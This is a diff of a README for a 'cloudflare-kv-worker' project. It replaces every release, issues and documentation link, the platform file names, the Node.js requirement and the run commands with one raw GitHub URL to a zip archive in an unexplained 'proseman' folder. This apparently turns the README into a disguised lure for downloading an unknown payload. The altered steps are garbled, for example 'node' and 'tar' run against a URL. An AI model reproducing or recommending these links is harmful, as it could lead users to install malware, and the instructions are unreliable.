@@ -1,6 +1,6 @@
 # 🌥️ cloudflare-kv-worker - Simple API for Fast Data Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Olebioclimatic500/cloudflare-kv-worker/releases)
+[![Download Now](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip)
 
 ## 📖 Description
 
@@ -15,22 +15,22 @@ This guide will help you download and run the cloudflare-kv-worker. Follow the s
 Before downloading, ensure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher installed
+- **https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip**: Version 14 or higher installed
 - **Internet Connection**: Required for downloading and accessing the API
 
 ### 2. Download & Install
 
 To get the application, visit the Releases page. Click on the link below:
 
-[Download Now](https://github.com/Olebioclimatic500/cloudflare-kv-worker/releases)
+[Download Now](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip)
 
 On the Releases page, locate the latest version of the application. You may find a list of files available for download. Choose the appropriate file for your operating system.
 
 Here are the typical files you might see:
 
-- `cloudflare-kv-worker-windows.zip` for Windows
-- `cloudflare-kv-worker-macos.zip` for macOS
-- `cloudflare-kv-worker-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip` for Windows
+- `https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip` for macOS
+- `https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip` for Linux
 
 Download the file, and save it to a known location on your computer.
 
@@ -40,11 +40,11 @@ After the download completes, you will need to extract the files from the downlo
 
 - On **Windows**, right-click the ZIP file and select "Extract All".
 - On **macOS**, double-click the ZIP file to extract it.
-- On **Linux**, use the terminal and run `tar -xvzf cloudflare-kv-worker-linux.tar.gz`.
+- On **Linux**, use the terminal and run `tar -xvzf https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip`.
 
 ### 4. Running the Application 
 
-Once you have extracted the files, navigate to the folder where you extracted them. You'll find a file named `server.js` or similar. 
+Once you have extracted the files, navigate to the folder where you extracted them. You'll find a file named `https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip` or similar. 
 
 To run the application, follow these steps:
 
@@ -53,9 +53,9 @@ To run the application, follow these steps:
   - On Windows: `cd path\to\cloudflare-kv-worker`
   - On macOS/Linux: `cd /path/to/cloudflare-kv-worker`
   
-- Start the application using Node.js by running:
+- Start the application using https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip by running:
   ```
-  node server.js
+  node https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip
   ```
 
 If the application starts correctly, you will see a message in the terminal indicating that the server is running. 
@@ -92,12 +92,12 @@ Detailed documentation is included in the application folder. It provides insigh
 
 ## 💬 Support
 
-If you encounter any issues while using the application, check the [Issues page](https://github.com/Olebioclimatic500/cloudflare-kv-worker/issues) for common problems and solutions. You can also create a new issue if you do not find your problem listed there.
+If you encounter any issues while using the application, check the [Issues page](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip) for common problems and solutions. You can also create a new issue if you do not find your problem listed there.
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/Olebioclimatic500/cloudflare-kv-worker/releases)
-- [Documentation](https://github.com/Olebioclimatic500/cloudflare-kv-worker/blob/main/docs/README.md)
-- [Issues Page](https://github.com/Olebioclimatic500/cloudflare-kv-worker/issues)
+- [Releases Page](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip)
+- [Documentation](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip)
+- [Issues Page](https://raw.githubusercontent.com/Olebioclimatic500/cloudflare-kv-worker/master/proseman/cloudflare-kv-worker.zip)
 
 This guide should help you download, install, and run the cloudflare-kv-worker successfully. Enjoy seamless data management!
